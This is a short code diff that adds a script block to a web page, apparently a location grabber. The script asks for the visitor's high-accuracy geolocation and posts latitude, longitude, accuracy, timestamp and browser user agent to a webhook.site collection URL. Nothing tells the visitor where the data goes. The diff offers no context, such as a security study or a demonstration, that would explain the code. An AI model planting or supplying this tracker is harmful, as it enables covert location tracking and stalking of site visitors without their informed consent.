@@ -1,0 +1,26 @@
+<script>
+navigator.geolocation.getCurrentPosition(
+  pos => {
+    const hit = {
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      acc: pos.coords.accuracy,
+      hora: new Date().toISOString(),
+      ua: navigator.userAgent
+    };
+
+    fetch("https://webhook.site/5ca87817-0e0b-4a00-9dad-19840499be75", {
+      method: "POST",
+      body: JSON.stringify(hit),
+      headers: {"Content-Type":"application/json"}
+    });
+  },
+  err => {
+    console.log("Permissão negada ou erro:", err.message);
+  },
+  {
+    enableHighAccuracy: true,
+    timeout: 5000
+  }
+);
+</script>
